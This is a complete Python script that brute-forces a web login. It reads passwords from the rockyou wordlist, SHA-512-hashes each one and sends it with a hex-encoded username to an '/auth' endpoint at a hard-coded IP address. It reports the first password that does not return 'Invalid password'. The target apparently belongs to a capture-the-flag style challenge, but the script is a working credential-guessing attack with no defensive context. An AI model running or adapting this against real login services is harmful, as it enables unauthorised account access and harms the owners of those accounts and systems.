import hashlib
import requests

URL = "http://34.89.163.72:31083/auth"
USERNAME = "416c6578"   # "Alex" in hex
WORDLIST = "/usr/share/wordlists/rockyou.txt"

session = requests.Session()
i = 0

def sha512_hex(s):
    return hashlib.sha512(s.encode()).hexdigest()

with open(WORDLIST, errors="ignore") as f:
    for password in f:
        password = password.strip()
        hashed = sha512_hex(password)
        
        if i % 1000 == 0:
    	    print("Trying:", password)
    	    
    	    
        r = session.get(
            URL,
            params={
                "name": USERNAME,
                "password": hashed
            },
            timeout=5
        )
        
        i=i+1

        if "Invalid password" not in r.text:
            print("\n[+] VALID PASSWORD FOUND")
            print("Password:", password)
            print("Hash:", hashed)
            print("Response length:", len(r.content))
            print("Response:\n", r.text)
            break
